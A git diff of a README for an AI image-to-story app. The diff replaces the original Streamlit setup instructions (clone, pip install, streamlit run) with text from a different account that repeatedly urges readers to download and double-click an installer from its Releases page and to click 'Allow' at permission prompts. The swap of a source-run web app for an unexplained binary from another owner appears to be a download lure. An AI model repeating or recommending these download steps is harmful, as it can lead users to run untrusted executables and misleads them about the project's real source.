@@ -1,152 +1,77 @@
-# 🎨 AI StoryWeaver ( [🌐 Live Demo](https://sannidhya-das-ai-storyweaver.streamlit.app/) )
- - Multilingual Image-to-Story & Voice Narrator (Powered by Google Gemini 2.5)
+# 🎨 AI-StoryWeaver - Create Engaging AI-Generated Stories
 
-![example](https://github.com/SannidhyaDas/AI-StoryWeaver/blob/main/assets/appInterface_1.png)
+## 🚀 Getting Started
 
-![example](https://github.com/SannidhyaDas/AI-StoryWeaver/blob/main/assets/appInterface_2.png)
+Welcome to AI-StoryWeaver! This application allows you to upload images and witness the incredible capabilities of Google Gemini 2.5 as it crafts and narrates human-like stories in multiple languages. Whether you're a storyteller or just love creativity, you're in the right place.
 
-> **Transform your images into emotionally expressive, multilingual narrated stories using Google Gemini 2.5 Voice AI.**
+## 📥 Download AI-StoryWeaver
 
----
+[![Download AI-StoryWeaver](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen.svg)](https://github.com/Anshudeshmukh14/AI-StoryWeaver/releases)
 
-## 🌟 Overview
+To get started, click the link above to visit the Releases page where you can download the latest version of AI-StoryWeaver.
 
-**AI StoryWeaver** is an interactive web app that converts a series of uploaded images into a **cohesive, culturally rich story**, then narrates it in a **selected voice, emotion, and language** — powered by **Google Gemini 2.5 multimodal and TTS APIs**.
+## 🖥️ System Requirements
 
-This project blends **visual storytelling**, **emotion-driven narration**, and **multilingual capabilities**, showcasing the potential of **Generative AI for creative applications** such as:
-- Digital storytelling
-- Interactive learning content
-- AI narrators for regional languages
-- Creative writing assistance
+Before downloading, ensure your system meets the following requirements:
 
----
+- Operating System: Windows 10 or later, macOS Sierra or later, or a modern Linux distribution.
+- Memory: At least 4 GB of RAM.
+- Disk Space: Minimum of 500 MB available.
+- Internet Connection: Required for image uploads and AI services.
 
-## 🚀 Key Features
+## 🔧 Features
 
-✅ **Multimodal Story Generation** – Generates complete, connected stories based on multiple uploaded images.  
-✅ **Emotion-Aware Narration** – Speaks with emotional tones like *cheerful, excited, sad, serious, or angry*.  
-✅ **Multilingual Support** – Supports English, Hindi, Bengali, Tamil, and Telugu.  
-✅ **Voice Selection** – Choose from multiple Gemini 2.5 narrator voices (Zephyr, Kore, Puck, etc.).  
-✅ **Cultural Context Awareness** – Generates stories with Indian names, places, and moral or twist endings depending on the style.  
-✅ **Streamlit UI** – Simple, elegant web interface for uploading images and controlling story parameters.  
+- **Image Upload:** Easily upload images to inspire unique stories.
+- **Story Generation:** Watch as AI generates narratives reflecting emotional depth and diverse languages.
+- **Text-to-Speech:** Enjoy stories narrated in a human-like voice.
+- **Multimodal Intelligence:** Leverage the power of AI to blend images and stories seamlessly.
+- **User-Friendly Interface:** Navigate intuitively without any technical background.
 
----
+## 📥 Download & Install
 
-## 🧠 How It Works
+1. Open your web browser.
+2. Visit the [Releases page](https://github.com/Anshudeshmukh14/AI-StoryWeaver/releases).
+3. Locate the latest version, which is marked clearly.
+4. Click on the appropriate file based on your operating system to initiate the download.
+5. Once downloaded, locate the file in your Downloads folder.
+6. Double-click the file to launch the installer.
+7. Follow the installation prompts. If prompted for permissions, click “Allow.”
+8. After installation, start the application from your desktop or applications folder.
 
-1. **Upload Images** – Provide 1–10 images as visual inspiration.
-2. **Select Style** – Choose from genres like *Comedy, Thriller, Fairy Tale, Sci-Fi, Mystery, Adventure,* or *Morale*.
-3. **Set Language & Emotion** – Select storytelling language and narration tone.
-4. **Gemini 2.5 Magic ✨** –  
-   - `gemini-2.5-flash-lite` generates the story from the visual and textual prompt.  
-   - `gemini-2.5-flash-preview-tts` narrates it in your chosen voice and emotional tone.
-5. **Listen & Enjoy** – The app plays your narrated story instantly.
+## 🌐 Using AI-StoryWeaver
 
----
-## 🛠️ Pipeline Blueprint
+1. **Launch the App:** Open AI-StoryWeaver from your applications folder or desktop shortcut.
+2. **Upload Images:** Click on the "Upload Image" button. Select the image you want to use for your story.
+3. **Generate Story:** After uploading, click the "Generate Story" button. The AI will work its magic and create a unique narrative based on your image.
+4. **Listen to the Story:** Once the story is generated, click the "Play" button to listen to it being narrated.
+5. **Save or Share:** You can save the generated story as a text file or share it directly with friends.
 
-![pipeline](https://github.com/SannidhyaDas/AI-StoryWeaver/blob/main/assets/pipeline.png)
+## ❓ FAQs
 
-| Layer                     | Components                     | Description                                       |
-| ------------------------- | ------------------------------ | ------------------------------------------------- |
-| **User Layer**            | Streamlit App                  | User uploads, selects controls                    |
-| **Prompt Layer**          | `create_advanced_prompt()`     | Creates language, emotion, and style-aware prompt |
-| **Story Model Layer**     | `gemini-2.5-flash-lite`        | Generates contextual story text from images       |
-| **Narration Model Layer** | `gemini-2.5-flash-preview-tts` | Converts story text into emotional audio          |
-| **Output Layer**          | Streamlit Renderer             | Displays text and plays back audio                |
+### What types of images can I upload?
 
----
-## 🧩 Tech Stack
+You can upload common image formats such as JPEG, PNG, or BMP. Ensure that the images are clear and relevant to the stories you wish to create.
 
-| Component | Technology |
-|------------|-------------|
-| **Generative AI** | Google Gemini 2.5 (Flash Lite + TTS) |
-| **Frontend** | Streamlit |
-| **Languages** | Python |
-| **Environment** | `.env` (for storing API key) |
-| **Libraries** | `google-genai`, `PIL`, `streamlit`, `dotenv`, `wave`, `base64`, `io` |
+### How does the AI generate stories?
 
----
+The AI uses advanced algorithms to analyze your uploaded image and create a narrative that corresponds to its content, themes, and emotions.
 
-## 🏗️ Project Structure
-```bash
-AI-StoryWeaver/
-│
-├─ main.py    # Core backend functions
-├─ app.py     # Streamlit frontend for user interaction
-├── assets/                        
-│   ├── appInterface_1.png            # e.g., image upload + user choice filling  
-│   ├── appInterface_2.png            # e.g., output story with audio 
-│   └── pipeline.png                  # working pipeline
-├─ requirements.txt # Python dependencies
-└─ README.md # Project documentation
+### Is there a limit on image size?
 
-```
----
+We recommend keeping images under 10 MB to ensure a smooth experience. Larger images may take longer to process.
 
-## ⚙️ Setup Instructions
+### Can I use this app offline?
 
-### 1️⃣ Clone the Repository
-```bash
-git clone https://github.com/SannidhyaDas/AI-StoryWeaver.git
-cd AI-StoryWeaver
-```
+Currently, an internet connection is required for both image uploads and AI services. An offline mode is planned for future releases.
 
-### 2️⃣ Install Dependencies
-```bash
-pip install -r requirements.txt
-```
+## 📄 License
 
-### 3️⃣ Configure Environment
+AI-StoryWeaver is open source and free to use. For detailed information about the license and contributions, please visit the [repository's license section](https://github.com/Anshudeshmukh14/AI-StoryWeaver/blob/main/LICENSE).
 
-Create a .env file in the root folder and add your Google API key:
-```ini
-GOOGLE_API_KEY=your_google_api_key_here
-```
+## 🔗 Learn More
 
-### 4️⃣ Run the App
-```bash
-streamlit run app.py
-```
+We’re continuously improving AI-StoryWeaver. Check back often for updates and new features!
 
-## 🌍 Supported Languages & Voices
+For additional support, feel free to contact us via the issues section of the repository.
 
-| Language             | Gemini Voice Options       |
-| -------------------- | -------------------------- |
-| English (US)         | Zephyr, Puck, Charon, Kore |
-| Hindi (India)        | Kore, Puck                 |
-| Bengali (Bangladesh) | Zephyr, Puck               |
-| Tamil (India)        | Kore, Puck                 |
-| Telugu (India)       | Kore, Puck                 |
-
-## 🎭 Supported Emotions
-
-- neutral
-- cheerful
-- excited
-- sad
-- angry
-- serious
----
-## 💡 Real-World Impact & Use Cases
-
-📚 **AI Storytelling Companion** – Empowers users and creators to turn simple visuals into emotionally rich, multilingual stories — perfect for digital media, education, and entertainment platforms.
-
-🎧 **Language Learning Assistant** – Enhances regional language fluency through story-based listening and contextual narration, supporting India's multilingual learning ecosystem.
-
-🎬 **Creative Script Generator** – Assists writers, filmmakers, and ad creators in ideating scripts or storyboards from visual inspiration — reducing pre-production time and boosting creativity.
-
-🌐 **Inclusive Voice Narration Platform** – Brings stories to life with expressive, emotion-aware voiceovers in multiple Indian languages — making storytelling accessible for all audiences.
-
-🎨 **Content Personalization Engine** – Demonstrates how multimodal GenAI can tailor content to user emotions, language, and context — a use case for personalized media and edtech experiences.
-
----
-## 🏁 Future Enhancements
-
-🎙️ Add custom voice cloning for personalized narration
-
-🖼️ Integrate background music generation
-
-🧠 Add memory to continue stories across sessions
-
-🌐 Extend to more regional languages 
+[Download AI-StoryWeaver](https://github.com/Anshudeshmukh14/AI-StoryWeaver/releases) to begin your journey of creative storytelling today!
